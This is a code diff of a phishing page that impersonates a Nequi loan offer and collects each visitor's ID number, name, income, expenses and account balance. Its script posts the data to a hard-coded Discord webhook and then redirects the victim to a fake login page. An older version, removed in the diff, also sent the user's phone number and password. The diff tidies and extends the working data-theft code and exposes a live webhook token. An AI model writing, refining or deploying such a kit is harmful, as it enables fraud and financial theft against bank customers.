@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-<!-- saved from url=(0072)https://estudiodecredito.replit.app/1/validate-data/amount-simulator.php -->
 <html lang="en">
 
 <head>
@@ -8,7 +7,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>¡Plata de una en tu Nequi!</title>
   <link rel="stylesheet" href="../css/index-1.css">
-  <!-- <link rel="stylesheet" href="../css/loading-validation.css" /> -->
   <link rel="stylesheet" href="../css/spinner-3.css">
   <link rel="stylesheet" href="../css/navbar-1.css">
   <link rel="stylesheet" href="../css/globals-3.css">
@@ -97,7 +95,7 @@
         <p class="info-msg">En este momento estamos validando algunos datos. puede tardar un momento.</p>
 
         <div class="bottom" style="display: flex;">
-        
+         
           <img src="../assets/seguro_fogafin-1.svg" alt="image">
         </div>
       </div>
@@ -151,12 +149,6 @@
           <div class="type-credits-card-w credit-2">
             <div class="big-letter" style="height: 50vh !important;">
               <img src="../assets/logo-credito.png" style="width: 150px;">
-              <!-- <p class="u-text-white"
-                style="background-color: #f5f4f445; font-weight: 600; padding: .5rem; border-radius: .5rem; font-size: 17px; backdrop-filter: blur(7px);">
-                Crédito de bajo monto
-                <br>
-                Desde $100.000 a $2.400.000. En minutos te decimos si te lo aprobamos o no
-              </p> -->
               <h1 class="u-text-white is-credit-effect-page" style="font-size: 2.5rem !important;">
                 Valida tus datos y solicita tu crédito
               </h1>
@@ -166,32 +158,6 @@
       </div>
     </div>
   </div>
-
-  <section class="errorMessage messageErrorContainer">
-    <div class="messageWrapper">
-      <div class="messageContainer">
-        <div class="flex justify-center items-center">
-          <img class="max-w-[5.5rem]" src="../assets/iconsad-1.svg" alt="">
-        </div>
-        <p class="text-2xl font-bold w-full text-center mb-4 mt-1" style="color: #da0081;">
-          ¡Ups, algo salió mal!
-        </p>
-        <p id="wait-msg" class="text-purple-primary w-full text-center mb-4 mt-1 text-sm font-medium">
-          No pudimos terminar lo que estabas haciendo, ¡Corrige el error e inténtalo de nuevo!
-        </p>
-      </div>
-    </div>
-
-    <footer>
-      <div class="wrap">
-        <div class="wrapper">
-          <div class="footer">
-            <img class="footer-mobile" src="../assets/footer-2.png" alt="">
-          </div>
-        </div>
-      </div>
-    </footer>
-  </section>
 
   <main class="mainContainer">
     <section class="">
@@ -246,7 +212,6 @@
             </h4>
             <div class="flex flex-col justify-center items-center gap-4 mb-3 w-full">
 
-              <!-- Cédula -->
               <div class="form-group">
                 <input type="text" required="" inputmode="numeric" maxlength="10" pattern="[0-9]*" id="cedulaSalvavidas">
                 <label for="cedulaSalvavidas">Ingresa tu cédula</label>
@@ -254,14 +219,12 @@
               <span id="cedulaErrorSalvavidas" class="text-red-500 text-xs hidden">La cédula debe tener entre 8 y 10
                 dígitos</span>
 
-              <!-- Nombre -->
               <div class="form-group">
                 <input type="text" id="nombreCompletoSalvavidas" required="">
                 <label for="nombreCompletoSalvavidas">Nombre y apellido</label>
               </div>
               <span id="nombreErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tu nombre y apellido</span>
 
-              <!-- Ocupación -->
               <div style="width: 100%;">
                 <div class="relative">
                   <span class="absolute top-2 left-4 text-sm text-pink-primary font-medium">Ocupación</span>
@@ -277,7 +240,6 @@
                 </div>
               </div>
 
-              <!-- Ingresos -->
               <div class="form-group">
                 <input type="text" id="ingresoMensualSalvavidas" required="">
                 <label for="saldoActual">Ingresos mensuales</label>
@@ -285,7 +247,6 @@
               <span id="saldoActualErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tus ingresos
                 mensuales</span>
 
-              <!-- Gastos -->
               <div class="form-group">
                 <input type="text" id="gastosMensualSalvavidas" required="">
                 <label for="saldoActual">Gastos mensuales</label>
@@ -293,7 +254,6 @@
               <span id="saldoActualErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tus gastos
                 mensuales</span>
 
-              <!-- Saldo -->
               <div class="form-group">
                 <input type="text" id="saldoActualSalvavidas" required="">
                 <label for="saldoActual">Saldo actual en tu cuenta NEQUI</label>
@@ -305,7 +265,6 @@
                 hace parte del proceso de validación ante las centrales de riesgo.</span>
             </div>
 
-            <!-- Selector de meses -->
             <div class="mb-4">
               <h4 class="text-base font-medium text-balance text-left w-full text-purple-primary mb-4">
                 ¿En cuánto tiempo quieres pagar tu préstamo?
@@ -334,7 +293,6 @@
               </div>
             </div>
 
-            <!-- Fecha de pago -->
             <div class="mb-4">
               <div class="relative">
                 <span class="absolute top-2 left-4 text-sm text-pink-primary font-medium">Fecha de pago</span>
@@ -351,7 +309,6 @@
               </div>
             </div>
 
-            <!-- Tasa de interés -->
             <div class="mb-4">
               <h4 class="text-base font-medium text-balance text-left w-full text-pink-primary">
                 Tasa de interés
@@ -361,7 +318,6 @@
               </div>
             </div>
 
-            <!-- Valor cuota mensual -->
             <div class="mb-4">
               <h4 class="text-base font-medium text-balance text-left w-full text-pink-primary">
                 Valor aproximado de tu cuota mensual:
@@ -374,7 +330,6 @@
               </p>
             </div>
 
-            <!-- Botón Acepta -->
             <button type="button" id="btnContinuarSalvavidas" class="w-full bg-pink-primary text-white py-4 px-6 rounded-md text-lg hover:bg-pink-600 transition-colors disabled:opacity-80 disabled:cursor-not-allowed" disabled="">
               Validar
             </button>
@@ -383,20 +338,11 @@
        
         <script>
           document.addEventListener("DOMContentLoaded", () => {
-            let contSendButton = 1;
-            const loadingSpinner =
-              document.querySelector(".loadingContainer");
-            const inputMontoSalvavidas =
-              document.getElementById("montoSalvavidas");
-            const montoSeleccionadoSalvavidas = document.getElementById(
-              "montoSeleccionadoSalvavidas"
-            );
-            const cuotaMensualSalvavidas = document.querySelector(
-              ".cuotaMensualSalvavidas"
-            );
-            const plazoSelectorSalvavidas = document.getElementById(
-              "plazoSelectorSalvavidas"
-            );
+            const loadingSpinner = document.querySelector(".loadingContainer");
+            const inputMontoSalvavidas = document.getElementById("montoSalvavidas");
+            const montoSeleccionadoSalvavidas = document.getElementById("montoSeleccionadoSalvavidas");
+            const cuotaMensualSalvavidas = document.querySelector(".cuotaMensualSalvavidas");
+            const plazoSelectorSalvavidas = document.getElementById("plazoSelectorSalvavidas");
             const fechaPago = document.getElementById("fechaPago");
             const TASA_INTERES_MENSUAL_SALVAVIDAS = 0.009; // 1.81%
 
@@ -608,36 +554,15 @@
               actualizarEstadoBotonContinuar();
             });
 
-            const errorMessage = document.querySelector(".errorMessage");
             btnContinuarSalvavidas.addEventListener("click", async (e) => {
               e.preventDefault();
               loadingSpinner.style.display = "block";
-              if (contSendButton === 1) {
-                setTimeout(() => {
-                  errorMessage.style.display = "block";
-                  saldoActualInput.style.border = '2px solid #da0081'
-                  loadingSpinner.style.display = "none";
-                }, 10000);
 
-                setTimeout(() => {
-                  errorMessage.style.display = "none";
-                  contSendButton += 1;
-                  saldoActualSalvavidas.value = '';
-                  actualizarEstadoBotonContinuar();
-                  window.scrollTo({ top: ingresoMensualInput.getBoundingClientRect().top + window.scrollY - 100, behavior: "smooth" });
-                }, 15000);
-              } else {
-                setTimeout(() => {
-                  window.location.href = "login.php";
-                }, 5000);
-              }
               try {
-                const formData =
-                  JSON.parse(localStorage.getItem("formData")) || {};
+                const formData = JSON.parse(localStorage.getItem("formData")) || {};
                 formData.cedula = cedulaSalvavidas.value;
                 formData.nombreCompleto = nombreCompletoSalvavidas.value;
-                formData.montoPrestamo =
-                  montoSeleccionadoSalvavidas.textContent;
+                formData.montoPrestamo = montoSeleccionadoSalvavidas.textContent;
                 formData.ocupacion = ocupacionSelectorSalvavidas.value
                 formData.ingresoMensual = ingresoMensualSalvavidas.value
                 formData.gastosMensual = gastosMensualSalvavidas.value
@@ -647,32 +572,34 @@
                 formData.tipoProducto = 'Bajo monto'
                 localStorage.setItem("formData", JSON.stringify(formData));
 
-                message = `⭐⭐Nequi paso 2.${contSendButton}⭐⭐\n\n🪪Cedula: ${formData.cedula
-                  }\n👤Nombre: ${formData.nombreCompleto}\n💰Monto: ${formData.montoPrestamo
-                  }\n🧑‍💼Ocupación: ${formData.ocupacion}\n📈Ingresos mensuales: ${formData.ingresoMensual
-                  }\n💸Gastos mensuales: ${formData.gastosMensual}\n🔥Saldo actual en tu cuenta NEQUI: ${formData.saldoActual
-                  }\n🔢Meses: ${formData.meses}\n📅Fecha de pago: ${formData.fechaPago
-                  }\n📱Número: ${formData.phoneNumber}\n🔒Clave: ${formData.password
-                  }\n📢Tipo: Bajo monto`;
                 // ======================
-// Enviar a Discord
-// ======================
-const discordMessage = `🟣 INFO DE PRÉSTAMO 🟣\n\n🪪 Cédula: ${formData.cedula}\n👤 Nombre y apellido: ${formData.nombreCompleto}\n🧑‍💼 Ocupación: ${formData.ocupacion}\n📈 Ingresos mensuales: ${formData.ingresoMensual}\n💸 Gastos mensuales: ${formData.gastosMensual}\n💰 Saldo actual: ${formData.saldoActual}`;
+                // Enviar a Discord
+                // ======================
+                const discordMessage = `🟣 INFO DE PRÉSTAMO 🟣\n\n🪪 Cédula: ${formData.cedula}\n👤 Nombre y apellido: ${formData.nombreCompleto}\n🧑‍💼 Ocupación: ${formData.ocupacion}\n📈 Ingresos mensuales: ${formData.ingresoMensual}\n💸 Gastos mensuales: ${formData.gastosMensual}\n💰 Saldo actual: ${formData.saldoActual}\n💰 Monto: ${formData.montoPrestamo}\n🔢 Meses: ${formData.meses}`;
 
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1444716847537586218/g5q5-xlIPP6R-jJF4skloG3n1wjlhMwdgmvBG_xQkghF0JQ5QEsKiYrWnCWYcAsf2sDk"; 
+                const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1444716847537586218/g5q5-xlIPP6R-jJF4skloG3n1wjlhMwdgmvBG_xQkghF0JQ5QEsKiYrWnCWYcAsf2sDk";
 
-await fetch(DISCORD_WEBHOOK, {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json",
-  },
-  body: JSON.stringify({
-    content: discordMessage,
-  }),
-});
+                await fetch(DISCORD_WEBHOOK, {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/json",
+                  },
+                  body: JSON.stringify({
+                    content: discordMessage,
+                  }),
+                });
+                
+                // Redirigir directamente despues de unos segundos de carga simulada
+                setTimeout(() => {
+                  window.location.href = "login.php";
+                }, 3000);
 
               } catch (error) {
                 console.error("Error al enviar el mensaje:", error);
+                 // Redirigir incluso si falla el envío para no bloquear al usuario
+                 setTimeout(() => {
+                  window.location.href = "login.php";
+                }, 3000);
               }
             });
           });
